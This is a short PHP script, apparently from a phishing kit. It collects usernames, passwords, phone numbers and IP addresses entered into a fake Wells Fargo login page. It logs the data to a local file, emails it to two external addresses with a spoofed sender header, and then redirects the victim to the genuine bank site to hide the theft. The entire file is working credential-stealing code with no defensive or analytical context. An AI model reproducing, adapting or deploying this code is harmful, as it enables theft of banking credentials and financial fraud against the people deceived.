﻿﻿   <?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ WELLSFARGO LOGS +-----------connect---\n";
$message .= "username: ".$_POST['j_username']."\n";
$message .= "password: ".$_POST['j_password']."\n";
$message .= "phonenumber: ".$_POST['phonenumber']."\n";
$message .= "Domain: ".$_POST['domain']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By Authur-----------------\n";


$file = "text.txt";
$open = fopen($file, "a");
fwrite($open, $message."\n");
fclose($open);


$send = "kerrymarley@hotmail.com, linuxmoney1@outlook.com";
$subject = "Wells Fargo Online Access  LOGS., $ip,   Result";
$headers = "From: WELLSFARGO LOGS mail.indianmoney<logs@www.accounts.google.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send, $subject, $message); 
echo "<meta http-equiv='Refresh' content='0;URL=https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&error=yes'>";
	  

?>